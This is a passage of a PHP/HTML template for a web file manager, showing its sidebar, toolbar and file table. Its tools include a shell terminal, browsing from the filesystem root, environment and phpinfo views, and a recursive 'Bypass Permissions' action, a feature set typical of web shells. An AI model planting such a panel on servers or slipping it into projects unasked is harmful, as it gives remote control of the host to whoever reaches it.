    <input type="text" name="q" placeholder="Search files…" value="<?=htmlspecialchars(isset($_GET['q'])?$_GET['q']:'')?>">
  </form>
  <div class="tb-right">
    <?php $isFav=$fm->isFav($fm->getCwd());?>
    <form method="post" style="display:contents">
      <input type="hidden" name="csrf_token" value="<?=htmlspecialchars($_SESSION['csrf_token'])?>">
      <input type="hidden" name="action" value="<?=$isFav?'remove_favorite':'add_favorite'?>">
      <input type="hidden" name="path" value="<?=htmlspecialchars($fm->getCwd())?>">
      <button class="btn btn-icon <?=$isFav?'btn-star':'btn-g'?>" title="<?=$isFav?'Unfavorite':'Favorite'?>">
        <svg viewBox="0 0 24 24" fill="<?=$isFav?'currentColor':'none'?>" stroke="currentColor" stroke-width="1.8" stroke-linecap="round"><polygon points="12 2 15.09 8.26 22 9.27 17 14.14 18.18 21.02 12 17.77 5.82 21.02 7 14.14 2 9.27 8.91 8.26 12 2"/></svg>
      </button>
    </form>
    <button type="button" class="btn btn-icon btn-g" id="viewBtn" title="Toggle view">
      <svg id="vIcoGrid" viewBox="0 0 24 24" style="display:none"><rect x="3" y="3" width="7" height="7"/><rect x="14" y="3" width="7" height="7"/><rect x="14" y="14" width="7" height="7"/><rect x="3" y="14" width="7" height="7"/></svg>
      <svg id="vIcoList" viewBox="0 0 24 24"><line x1="8" y1="6" x2="21" y2="6"/><line x1="8" y1="12" x2="21" y2="12"/><line x1="8" y1="18" x2="21" y2="18"/><line x1="3" y1="6" x2="3.01" y2="6"/><line x1="3" y1="12" x2="3.01" y2="12"/><line x1="3" y1="18" x2="3.01" y2="18"/></svg>
    </button>
    <a href="?dir=<?=urlencode(dirname($fm->getCwd()))?>" class="btn btn-sm btn-g"><svg viewBox="0 0 24 24"><polyline points="15 18 9 12 15 6"/></svg><span>Up</span></a>
    <a href="?<?=http_build_query(array_merge($_GET,['_r'=>time()]))?>" class="btn btn-icon btn-g" title="Refresh">
      <svg viewBox="0 0 24 24"><polyline points="23 4 23 10 17 10"/><path d="M20.49 15a9 9 0 1 1-2.12-9.36L23 10"/></svg>
    </a>
    <?php if(!empty($_SESSION['fm_admin'])):?>
    <button type="button" class="btn btn-sm btn-g" id="usersBtn"><svg viewBox="0 0 24 24"><circle cx="9" cy="7" r="4"/><path d="M2 21v-2a4 4 0 0 1 4-4h6a4 4 0 0 1 4 4v2"/><circle cx="19" cy="8" r="3"/></svg><span>Users</span></button>
    <?php endif;?>
    <span style="font-size:11.5px;color:var(--t3);padding:0 2px;white-space:nowrap"><?=htmlspecialchars($_SESSION['fm_user']??'')?></span>
    <div class="dv"></div>
    <form method="post">
      <input type="hidden" name="csrf_token" value="<?=htmlspecialchars($_SESSION['csrf_token'])?>">
      <input type="hidden" name="action" value="logout">
      <button class="btn btn-sm btn-g" style="color:#fca5a5;border-color:rgba(239,68,68,.2)"><svg viewBox="0 0 24 24"><path d="M9 21H5a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h4"/><polyline points="16 17 21 12 16 7"/><line x1="21" y1="12" x2="9" y2="12"/></svg><span>Out</span></button>
    </form>
  </div>
</header>

<div class="ov" id="sideOv"></div>

<!-- SIDEBAR -->
<aside class="sidebar" id="sidebar">
  <div class="sb-sec">
    <div class="sb-nav">
      <a href="?dir=<?=urlencode($fm->getSysRoot())?>" class="sb-item"><svg viewBox="0 0 24 24"><rect x="2" y="3" width="20" height="14" rx="2"/><line x1="8" y1="21" x2="16" y2="21"/><line x1="12" y1="17" x2="12" y2="21"/></svg>Root (/)</a>
      <a href="?dir=<?=urlencode(__DIR__)?>" class="sb-item"><svg viewBox="0 0 24 24"><path d="M3 9l9-7 9 7v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"/><polyline points="9 22 9 12 15 12 15 22"/></svg>Home</a>
      <a href="?dir=<?=urlencode(dirname($fm->getCwd()))?>" class="sb-item"><svg viewBox="0 0 24 24"><polyline points="15 18 9 12 15 6"/></svg>Up one level</a>
      <a href="?<?=http_build_query(array_merge($_GET,['hidden'=>$curHidden?'0':'1']))?>" class="sb-item">
        <svg viewBox="0 0 24 24"><?=$curHidden?'<path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/>':'<path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24"/><line x1="1" y1="1" x2="23" y2="23"/>'?></svg><?=$curHidden?'Hide dotfiles':'Show dotfiles'?>
      </a>
    </div>
  </div>
  <div class="sb-div"></div>
  <div class="sb-sec"><div class="sb-label">Tools</div>
    <div class="sb-nav">
      <?php if(!$fm->isRO()):?>
      <button class="sb-item" id="termBtn"><svg viewBox="0 0 24 24"><polyline points="4 17 10 11 4 5"/><line x1="12" y1="19" x2="20" y2="19"/></svg>Terminal</button>
      <?php endif;?>
      <button class="sb-item" id="actBtn"><svg viewBox="0 0 24 24"><polyline points="22 12 18 12 15 21 9 3 6 12 2 12"/></svg>Activity Log</button>
      <button class="sb-item" id="srvBtn"><svg viewBox="0 0 24 24"><rect x="2" y="2" width="20" height="8" rx="2"/><rect x="2" y="14" width="20" height="8" rx="2"/><line x1="6" y1="6" x2="6.01" y2="6"/><line x1="6" y1="18" x2="6.01" y2="18"/></svg>Server Info</button>
      <?php if(!$fm->isRO()):?>
      <button class="sb-item" id="brBtn"><svg viewBox="0 0 24 24"><path d="M17 3a2.828 2.828 0 1 1 4 4L7.5 20.5 2 22l1.5-5.5L17 3z"/></svg>Batch Rename</button>
      <button class="sb-item" id="symlinkBtn"><svg viewBox="0 0 24 24"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"/><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"/></svg>Symlink</button>
      <button class="sb-item" id="sharesBtn"><svg viewBox="0 0 24 24"><circle cx="18" cy="5" r="3"/><circle cx="6" cy="12" r="3"/><circle cx="18" cy="19" r="3"/><line x1="8.59" y1="13.51" x2="15.42" y2="17.49"/><line x1="15.41" y1="6.51" x2="8.59" y2="10.49"/></svg>Share Links</button>
      <form method="post" style="width:100%">
        <input type="hidden" name="csrf_token" value="<?=htmlspecialchars($_SESSION['csrf_token'])?>">
        <input type="hidden" name="action" value="backup_dir">
        <button type="button" onclick="if(confirm('Create a .zip backup of the current folder?'))this.closest('form').submit()" class="sb-item"><svg viewBox="0 0 24 24"><path d="M21 8v13H3V8"/><path d="M1 3h22v5H1z"/><line x1="10" y1="12" x2="14" y2="12"/></svg>Backup Folder</button>
      </form>
      <?php endif;?>
      <button class="sb-item" id="largeBtn"><svg viewBox="0 0 24 24"><path d="M13 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V9z"/><polyline points="13 2 13 9 20 9"/><line x1="9" y1="15" x2="15" y2="15"/></svg>Large Files</button>
      <button class="sb-item" id="dupBtn"><svg viewBox="0 0 24 24"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg>Find Duplicates</button>
      <button class="sb-item" id="speedBtn"><svg viewBox="0 0 24 24"><path d="M13 2L3 14h9l-1 8 10-12h-9l1-8z"/></svg>Speed Test</button>
      <?php if(!empty($_SESSION['fm_admin'])):?>
      <button class="sb-item" id="errLogBtn"><svg viewBox="0 0 24 24"><circle cx="12" cy="12" r="10"/><line x1="12" y1="8" x2="12" y2="12"/><line x1="12" y1="16" x2="12.01" y2="16"/></svg>Error Log</button>
      <button class="sb-item" id="envBtn"><svg viewBox="0 0 24 24"><polyline points="4 17 10 11 4 5"/><line x1="12" y1="19" x2="20" y2="19"/></svg>Environment</button>
      <a href="?x=phpinfo" target="_blank" class="sb-item"><svg viewBox="0 0 24 24"><circle cx="12" cy="12" r="10"/><path d="M9.09 9a3 3 0 0 1 5.83 1c0 2-3 2-3 4"/><line x1="12" y1="17" x2="12.01" y2="17"/></svg>PHP Info</a>
      <?php endif;?>
    </div>
  </div>
  <div class="sb-div"></div>
  <div style="padding:0 8px 4px;flex-shrink:0"><div class="sb-label">Favorites</div></div>
  <div style="padding:0 8px;flex-shrink:0;max-height:28vh;overflow-y:auto">
    <?php $favs=$fm->getFavs();foreach($favs as $fp):?>
    <div class="sb-fav-row">
      <a href="?dir=<?=urlencode($fp)?>" class="sb-flink" style="flex:1">
        <svg viewBox="0 0 24 24" fill="#f59e0b" stroke="#f59e0b" stroke-width="1.5"><polygon points="12 2 15.09 8.26 22 9.27 17 14.14 18.18 21.02 12 17.77 5.82 21.02 7 14.14 2 9.27 8.91 8.26 12 2"/></svg>
        <span><?=htmlspecialchars(basename($fp))?></span>
      </a>
      <form method="post"><input type="hidden" name="csrf_token" value="<?=htmlspecialchars($_SESSION['csrf_token'])?>"><input type="hidden" name="action" value="remove_favorite"><input type="hidden" name="path" value="<?=htmlspecialchars($fp)?>">
        <button class="sb-fav-del"><svg viewBox="0 0 24 24"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg></button>
      </form>
    </div>
    <?php endforeach;if(empty($favs)):?><div class="sb-empty">No favorites yet</div><?php endif;?>
  </div>
  <div class="sb-div"></div>
  <div style="padding:0 8px 4px;flex-shrink:0"><div class="sb-label">Folders here</div></div>
  <div class="sb-scroll">
    <?php foreach($list['folders'] as $f):?>
    <a href="?dir=<?=urlencode($fm->getCwd().'/'.$f['name'])?>" class="sb-flink">
      <svg viewBox="0 0 24 24" stroke="#818cf8" fill="none" stroke-width="1.8" stroke-linecap="round"><path d="M3 7a2 2 0 0 1 2-2h4l2 2h8a2 2 0 0 1 2 2v8a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z" fill="rgba(129,140,248,.12)"/></svg>
      <span><?=htmlspecialchars($f['name'])?></span>
    </a>
    <?php endforeach;if(empty($list['folders'])):?><div class="sb-empty">No folders</div><?php endif;?>
  </div>
  <div class="sb-footer">
    <div class="disk-w">
      <div class="disk-lbl"><span>Disk</span><span><?=fmtSz($diskUsed)?> / <?=fmtSz($diskTotal)?></span></div>
      <div class="disk-tr"><div class="disk-fi <?=$diskPct>=90?'crit':($diskPct>=75?'warn':'')?>" style="width:<?=$diskPct?>%"></div></div>
    </div>
    <?php if(!$fm->isRO()):?>
    <form method="post">
      <input type="hidden" name="csrf_token" value="<?=htmlspecialchars($_SESSION['csrf_token'])?>">
      <input type="hidden" name="action" value="bypass_perms">
      <button type="button" onclick="if(confirm('Change permissions recursively?'))this.closest('form').submit()" class="sb-item danger">
        <svg viewBox="0 0 24 24"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>Bypass Permissions
      </button>
    </form>
    <?php endif;?>
  </div>
</aside>

<!-- MAIN -->
<main class="main">
  <?php if(!$editMode):?>
  <div class="toolbar">
    <?php if(!$fm->isRO()):?>
    <div class="tb-row" style="flex-wrap:wrap;gap:6px">
      <form method="post" enctype="multipart/form-data" id="uploadForm">
        <input type="hidden" name="csrf_token" value="<?=htmlspecialchars($_SESSION['csrf_token'])?>">
        <input type="hidden" name="action" value="upload">
        <input type="file" name="file[]" id="upFile" multiple>
        <label for="upFile" class="upl-lbl"><svg viewBox="0 0 24 24"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><polyline points="17 8 12 3 7 8"/><line x1="12" y1="3" x2="12" y2="15"/></svg>Upload</label>
      </form>
      <form method="post" style="display:contents">
        <input type="hidden" name="csrf_token" value="<?=htmlspecialchars($_SESSION['csrf_token'])?>">
        <input type="hidden" name="action" value="create_folder">
        <input type="text" name="folder_name" class="inp" placeholder="New folder…" required style="width:130px">
        <button class="btn btn-sm btn-green"><svg viewBox="0 0 24 24"><path d="M22 19a2 2 0 0 1-2 2H4a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h5l2 3h9a2 2 0 0 1 2 2z"/><line x1="12" y1="11" x2="12" y2="17"/><line x1="9" y1="14" x2="15" y2="14"/></svg><span>Folder</span></button>
      </form>
      <form method="post" style="display:contents">
        <input type="hidden" name="csrf_token" value="<?=htmlspecialchars($_SESSION['csrf_token'])?>">
        <input type="hidden" name="action" value="create_file">
        <input type="text" name="file_name" class="inp" placeholder="New file…" required style="width:120px">
        <button class="btn btn-sm btn-blue"><svg viewBox="0 0 24 24"><path d="M13 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V9z"/><polyline points="13 2 13 9 20 9"/><line x1="12" y1="13" x2="12" y2="19"/><line x1="9" y1="16" x2="15" y2="16"/></svg><span>File</span></button>
      </form>
    </div>
    <?php endif;?>
    <div class="tb-row" style="flex-wrap:wrap;gap:6px">
      <form method="post" style="display:contents">
        <input type="hidden" name="csrf_token" value="<?=htmlspecialchars($_SESSION['csrf_token'])?>">
        <input type="hidden" name="action" value="go_to_path">
        <input type="text" name="path" class="inp" placeholder="Jump to path…" style="flex:1;min-width:140px">
        <button class="btn btn-sm btn-g"><svg viewBox="0 0 24 24"><line x1="5" y1="12" x2="19" y2="12"/><polyline points="12 5 19 12 12 19"/></svg>Go</button>
      </form>
      <form method="get" style="display:contents">
        <input type="hidden" name="dir" value="<?=htmlspecialchars($fm->getCwd())?>">
        <input type="text" name="cs" class="inp" placeholder="Search in file contents…" value="<?=htmlspecialchars(isset($_GET['cs'])?$_GET['cs']:'')?>" style="flex:1;min-width:160px">
        <label style="display:flex;align-items:center;gap:4px;font-size:11.5px;color:var(--t2);cursor:pointer;white-space:nowrap"><input type="checkbox" name="deep" value="1" <?=isset($_GET['deep'])&&$_GET['deep']==='1'?'checked':''?>>Deep</label>
        <button class="btn btn-sm btn-g"><svg viewBox="0 0 24 24"><circle cx="11" cy="11" r="8"/><line x1="21" y1="21" x2="16.65" y2="16.65"/></svg>Find</button>
      </form>
    </div>
  </div>
  <?php endif;?>

  <div class="content" id="dropzone">
    <!-- Alerts -->
    <?php if(!empty($fm->getMsgs())):?>
    <div class="alerts">
      <?php foreach($fm->getMsgs() as $msg):$icons=['success'=>'<polyline points="20 6 9 17 4 12"/>','danger'=>'<line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/>','warning'=>'<path d="M10.29 3.86L1.82 18a2 2 0 0 0 1.71 3h16.94a2 2 0 0 0 1.71-3L13.71 3.86a2 2 0 0 0-3.42 0z"/><line x1="12" y1="9" x2="12" y2="13"/><line x1="12" y1="17" x2="12.01" y2="17"/>'];$ic=isset($icons[$msg['type']])?$icons[$msg['type']]:'';?>
      <div class="alert <?=htmlspecialchars($msg['type'])?>" role="alert">
        <svg viewBox="0 0 24 24"><?=$ic?></svg><?=htmlspecialchars($msg['text'])?>
        <button class="alert-x"><svg viewBox="0 0 24 24"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg></button>
      </div>
      <?php endforeach;?>
    </div>
    <?php endif;?>

    <?php if(isset($_GET['cs'])&&$_GET['cs']!==''):
      $cs=$fm->contentSearch($_GET['cs'],isset($_GET['deep'])&&$_GET['deep']==='1');?>
    <div class="card" style="margin-bottom:12px">
      <div style="padding:10px 14px;background:var(--raised);border-bottom:1px solid var(--border);display:flex;align-items:center;gap:8px">
        <svg viewBox="0 0 24 24" fill="none" stroke="var(--link)" stroke-width="2" stroke-linecap="round" style="width:15px;height:15px;flex-shrink:0"><circle cx="11" cy="11" r="8"/><line x1="21" y1="21" x2="16.65" y2="16.65"/></svg>
        <span style="font-size:13px;font-weight:700;color:var(--t1)">Results: "<?=htmlspecialchars($_GET['cs'])?>"</span>
        <span style="font-size:11px;color:var(--t3)"><?=count($cs)?> match(es)</span>
        <a href="?dir=<?=urlencode($fm->getCwd())?>" class="btn btn-xs btn-g" style="margin-left:auto">Clear</a>
      </div>
      <?php foreach($cs as $r):?>
      <div style="padding:10px 14px;border-bottom:1px solid var(--border)">
        <a href="?edit=<?=urlencode($r['name'])?>&dir=<?=urlencode($r['dir'])?>" style="font-family:'JetBrains Mono',monospace;font-size:12px;color:var(--link);display:block;margin-bottom:4px;text-decoration:none;overflow:hidden;text-overflow:ellipsis;white-space:nowrap"><?=htmlspecialchars($r['path'])?></a>
        <div style="font-size:11.5px;color:var(--t3);font-family:'JetBrains Mono',monospace;background:var(--raised);padding:5px 9px;border-radius:5px;line-height:1.6">…<?=htmlspecialchars($r['snippet'])?>…</div>
      </div>
      <?php endforeach;if(!$cs):?><div class="empty" style="padding:28px"><p>No matches.</p></div><?php endif;?>
    </div>
    <?php endif;?>

    <?php if($editMode):?>
    <!-- EDITOR -->
    <div class="ed-card">
      <div class="ed-head">
        <div class="ed-fname"><svg viewBox="0 0 24 24"><path d="M11 4H4a2 2 0 0 0-2 2v14a2 2 0 0 0 2 2h14a2 2 0 0 0 2-2v-7"/><path d="M18.5 2.5a2.121 2.121 0 0 1 3 3L12 15l-4 1 1-4 9.5-9.5z"/></svg><?=htmlspecialchars($editFile)?></div>
        <span class="ed-meta"><?=number_format(strlen($editContent))?> bytes · <?=substr_count($editContent,"\n")+1?> lines</span>
        <a href="?dir=<?=urlencode(isset($_GET['dir'])?$_GET['dir']:'')?>" class="btn btn-xs btn-g" style="margin-left:8px"><svg viewBox="0 0 24 24"><line x1="19" y1="12" x2="5" y2="12"/><polyline points="12 19 5 12 12 5"/></svg>Back</a>
      </div>
      <form method="post">
        <input type="hidden" name="csrf_token" value="<?=htmlspecialchars($_SESSION['csrf_token'])?>">
        <input type="hidden" name="action" value="save_edit"><input type="hidden" name="filename" value="<?=htmlspecialchars($editFile)?>">
        <textarea name="content" class="code" spellcheck="false"><?=htmlspecialchars($editContent)?></textarea>
        <div class="ed-foot">
          <div class="ed-hint"><kbd>Tab</kbd> indent &nbsp;·&nbsp; <kbd>Ctrl+S</kbd> save</div>
          <div style="display:flex;gap:6px">
            <a href="?dir=<?=urlencode(isset($_GET['dir'])?$_GET['dir']:'')?>" class="btn btn-sm btn-g">Cancel</a>
            <button class="btn btn-sm btn-p"><svg viewBox="0 0 24 24"><path d="M19 21H5a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h11l5 5v11a2 2 0 0 1-2 2z"/><polyline points="17 21 17 13 7 13 7 21"/><polyline points="7 3 7 8 15 8"/></svg>Save</button>
          </div>
        </div>
      </form>
    </div>

    <?php else:?>
    <!-- FILE VIEWS -->
    <!-- Filter bar -->
    <div class="filter-bar">
      <?php $filterIcons=[
        'all'=>'<rect x="3" y="3" width="7" height="7" rx="1.5"/><rect x="14" y="3" width="7" height="7" rx="1.5"/><rect x="3" y="14" width="7" height="7" rx="1.5"/><rect x="14" y="14" width="7" height="7" rx="1.5"/>',
        'images'=>'<rect x="3" y="3" width="18" height="18" rx="2"/><circle cx="8.5" cy="8.5" r="1.5"/><path d="M21 15l-5-5L5 21"/>',
        'videos'=>'<rect x="2" y="5" width="14" height="14" rx="2"/><path d="M16 10l6-4v12l-6-4z"/>',
        'audio'=>'<path d="M9 18V5l12-2v13"/><circle cx="6" cy="18" r="3"/><circle cx="18" cy="16" r="3"/>',
        'code'=>'<polyline points="16 18 22 12 16 6"/><polyline points="8 6 2 12 8 18"/>',
        'docs'=>'<path d="M13 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V9z"/><polyline points="13 2 13 9 20 9"/><line x1="8" y1="13" x2="16" y2="13"/><line x1="8" y1="17" x2="13" y2="17"/>',
        'archives'=>'<rect x="3" y="3" width="18" height="18" rx="2"/><path d="M8 3v18M14 8h2M14 12h2M14 16h2"/>',
        'text'=>'<path d="M13 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V9z"/><polyline points="13 2 13 9 20 9"/><line x1="8" y1="13" x2="16" y2="13"/><line x1="8" y1="17" x2="13" y2="17"/>',
      ];
      $filters=['all'=>'All','images'=>'Images','videos'=>'Video','audio'=>'Audio','code'=>'Code','docs'=>'Docs','archives'=>'Archives','text'=>'Text'];
      foreach($filters as $fk=>$fl):?>
      <button class="fb-btn <?=$curTF===$fk||($curTF===''&&$fk==='all')?'active':''?>" onclick="location.href='?<?=http_build_query(array_merge($_GET,['tf'=>$fk==='all'?'':$fk]))?>'">
        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round" style="width:13px;height:13px;flex-shrink:0"><?=$filterIcons[$fk]?></svg><?=$fl?><?php if($fk!=='all'): $cnt=0;foreach($list['files'] as $fi){$t=$fi['type'];$g=['images'=>'image','videos'=>'video','audio'=>'audio','code'=>'code','docs'=>['pdf','word','excel'],'archives'=>'archive','text'=>'text'];$want=isset($g[$fk])?$g[$fk]:'';if(is_array($want)){if(in_array($t,$want))$cnt++;}elseif($t===$want)$cnt++;} if($cnt>0) echo ' <span style="opacity:.6">('.$cnt.')</span>'; endif;?>
      </button>
      <?php endforeach;?>
    </div>

    <!-- LIST VIEW -->
    <div id="lvw">
    <div class="card">
      <div class="tw">
        <table class="ft" id="fileTable">
          <thead>
            <tr>
              <th class="cc"><input type="checkbox" class="rck" id="checkAll"></th>
              <th style="width:99%"><a href="<?=sortUrl('name')?>" class="<?=$curSort==='name'?'sa':''?>">Name<span class="arr"><?=$curSort==='name'?($curDir_==='asc'?'↑':'↓'):'↕'?></span></a></th>
              <th class="col-perms"><span>Perms</span></th>
              <th class="col-mtime"><a href="<?=sortUrl('mtime')?>" class="<?=$curSort==='mtime'?'sa':''?>">Modified<span class="arr"><?=$curSort==='mtime'?($curDir_==='asc'?'↑':'↓'):'↕'?></span></a></th>
              <th class="col-size"><a href="<?=sortUrl('size')?>" class="<?=$curSort==='size'?'sa':''?>">Size<span class="arr"><?=$curSort==='size'?($curDir_==='asc'?'↑':'↓'):'↕'?></span></a></th>
              <th style="text-align:right;padding-right:14px">Actions</th>
            </tr>
          </thead>
          <tbody>
          <?php foreach($list['folders'] as $f):
            $perms=substr(sprintf('%o',fileperms($fm->getCwd().'/'.$f['name'])),-4);
          ?>
          <tr data-name="<?=he($f['name'])?>" data-isdir="1" tabindex="0">
            <td class="cc"><input type="checkbox" class="rck item-ck" value="<?=he($f['name'])?>"></td>
            <td><div class="nc" onclick="location.href='?dir=<?=urlencode($fm->getCwd().'/'.$f['name'])?>'"
              data-ctx-name="<?=he($f['name'])?>" data-ctx-isdir="1" data-ctx-perm="<?=he($perms)?>">
              <div class="ib" style="background:rgba(129,140,248,.1)"><?=svgFolder()?></div>
              <div class="nm"><span class="nt"><?=htmlspecialchars($f['name'])?></span><span class="eb">DIR</span></div>
            </div></td>
            <td class="col-perms col-perms-td"><span class="mono"><?=he($perms)?></span></td>
            <td class="col-mtime col-mtime-td"><span class="mt"><?=date('d/m/Y H:i',$f['mtime'])?></span></td>
            <td class="col-size"><button type="button" class="btn btn-xs btn-g dsz-btn" data-n="<?=he($f['name'])?>" title="Calculate folder size"><svg viewBox="0 0 24 24"><ellipse cx="12" cy="5" rx="9" ry="3"/><path d="M21 12c0 1.66-4 3-9 3s-9-1.34-9-3"/><path d="M3 5v14c0 1.66 4 3 9 3s9-1.34 9-3V5"/></svg><span class="bl">Size</span></button></td>
            <td><div class="acts">
              <?php if(!$fm->isRO()):?><button data-a="perm" data-n="<?=he($f['name'])?>" data-perm="<?=he($perms)?>" class="btn btn-xs btn-g" title="Permissions"><svg viewBox="0 0 24 24"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg><span class="bl">Perm</span></button><?php endif;?>
              <button data-a="ren" data-n="<?=he($f['name'])?>" class="btn btn-xs btn-amb"><svg viewBox="0 0 24 24"><path d="M11 4H4a2 2 0 0 0-2 2v14a2 2 0 0 0 2 2h14a2 2 0 0 0 2-2v-7"/><path d="M18.5 2.5a2.121 2.121 0 0 1 3 3L12 15l-4 1 1-4 9.5-9.5z"/></svg><span class="bl">Rename</span></button>
              <?php if(!$fm->isRO()):?><button data-a="del" data-n="<?=he($f['name'])?>" class="btn btn-xs btn-red"><svg viewBox="0 0 24 24"><polyline points="3 6 5 6 21 6"/><path d="M19 6l-1 14a2 2 0 0 1-2 2H8a2 2 0 0 1-2-2L5 6"/><path d="M10 11v6"/><path d="M14 11v6"/></svg><span class="bl">Delete</span></button><?php endif;?>
            </div></td>
          </tr>
          <?php endforeach;?>

          <?php foreach($list['files'] as $f):
            $type=$f['type'];$color=$fm->getColor($type);
            $ext=strtolower(pathinfo($f['name'],PATHINFO_EXTENSION));
            $perms=substr(sprintf('%o',fileperms($fm->getCwd().'/'.$f['name'])),-4);
            $prev=$fm->canPreview($type);$isTar=$fm->isTar($f['name']);
            $rawUrl='?raw='.urlencode($f['name']).'&dir='.urlencode($fm->getCwd());
          ?>
          <tr data-name="<?=he($f['name'])?>" data-isdir="0" data-type="<?=$type?>" tabindex="0">
            <td class="cc"><input type="checkbox" class="rck item-ck" value="<?=he($f['name'])?>"></td>
            <td><div class="nc" <?php if($prev):?>data-preview="<?=he($rawUrl)?>" data-type="<?=$type?>" data-fname="<?=he($f['name'])?>"<?php endif;?>
              data-ctx-name="<?=he($f['name'])?>" data-ctx-isdir="0" data-ctx-type="<?=$type?>" data-ctx-raw="<?=he($rawUrl)?>" data-ctx-perm="<?=he($perms)?>">
              <div class="ib" style="background:<?=$color?>18">
                <?php if($type==='image'):?><img src="<?=$rawUrl?>" style="width:34px;height:34px;border-radius:9px;object-fit:cover" loading="lazy" onerror="this.style.display='none';this.nextSibling&&(this.nextSibling.style.display='block')"><?php endif;?>
                <?=svgFile($type)?>
              </div>
              <div class="nm"><span class="nt"><?=htmlspecialchars($f['name'])?></span><?php if($ext):?><span class="eb"><?=strtoupper($ext)?></span><?php endif;?></div>
            </div></td>
            <td class="col-perms col-perms-td"><span class="mono"><?=he($perms)?></span></td>
            <td class="col-mtime col-mtime-td"><span class="mt"><?=date('d/m/Y H:i',$f['mtime'])?></span></td>
            <td class="col-size"><span class="sz"><?=fmtSz($f['size'])?></span></td>
            <td><div class="acts">
              <a href="<?=$rawUrl?>&dl=1" class="btn btn-xs btn-g"><svg viewBox="0 0 24 24"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><polyline points="7 10 12 15 17 10"/><line x1="12" y1="15" x2="12" y2="3"/></svg><span class="bl">Download</span></a>
              <?php if(!$fm->isRO()):?><button data-a="share" data-n="<?=he($f['name'])?>" class="btn btn-xs btn-g" title="Share Link"><svg viewBox="0 0 24 24"><circle cx="18" cy="5" r="3"/><circle cx="6" cy="12" r="3"/><circle cx="18" cy="19" r="3"/><line x1="8.59" y1="13.51" x2="15.42" y2="17.49"/><line x1="15.41" y1="6.51" x2="8.59" y2="10.49"/></svg><span class="bl">Share</span></button><?php endif;?>
              <?php if($ext==='zip'):?><button data-a="unzip" data-n="<?=he($f['name'])?>" class="btn btn-xs btn-blue"><svg viewBox="0 0 24 24"><polyline points="21 8 21 21 3 21 3 8"/><rect x="1" y="3" width="22" height="5"/><line x1="10" y1="12" x2="14" y2="12"/></svg><span class="bl">Extract</span></button>
              <?php elseif($isTar):?><button data-a="tar-x" data-n="<?=he($f['name'])?>" class="btn btn-xs btn-blue"><svg viewBox="0 0 24 24"><polyline points="21 8 21 21 3 21 3 8"/><rect x="1" y="3" width="22" height="5"/></svg><span class="bl">Extract</span></button><?php endif;?>
              <a href="?edit=<?=urlencode($f['name'])?>&dir=<?=urlencode(isset($_GET['dir'])?$_GET['dir']:'')?>" class="btn btn-xs btn-blue"><svg viewBox="0 0 24 24"><path d="M11 4H4a2 2 0 0 0-2 2v14a2 2 0 0 0 2 2h14a2 2 0 0 0 2-2v-7"/><path d="M18.5 2.5a2.121 2.121 0 0 1 3 3L12 15l-4 1 1-4 9.5-9.5z"/></svg><span class="bl">Edit</span></a>
              <button data-a="hash" data-n="<?=he($f['name'])?>" class="btn btn-xs btn-g" title="Checksum"><svg viewBox="0 0 24 24"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg><span class="bl">Hash</span></button>
              <?php if(!$fm->isRO()):?>
              <button data-a="perm" data-n="<?=he($f['name'])?>" data-perm="<?=he($perms)?>" class="btn btn-xs btn-g" title="Permissions"><svg viewBox="0 0 24 24"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg><span class="bl">Perm</span></button>
              <button data-a="dup" data-n="<?=he($f['name'])?>" class="btn btn-xs btn-g" title="Duplicate"><svg viewBox="0 0 24 24"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg><span class="bl">Dup</span></button>
              <button data-a="ren" data-n="<?=he($f['name'])?>" class="btn btn-xs btn-amb"><svg viewBox="0 0 24 24"><polyline points="5 12 12 5 19 12"/><line x1="12" y1="5" x2="12" y2="19"/></svg><span class="bl">Rename</span></button>
              <button data-a="del" data-n="<?=he($f['name'])?>" class="btn btn-xs btn-red"><svg viewBox="0 0 24 24"><polyline points="3 6 5 6 21 6"/><path d="M19 6l-1 14a2 2 0 0 1-2 2H8a2 2 0 0 1-2-2L5 6"/><path d="M10 11v6"/><path d="M14 11v6"/></svg><span class="bl">Del</span></button>
              <?php endif;?>
            </div></td>
          </tr>
          <?php endforeach;?>
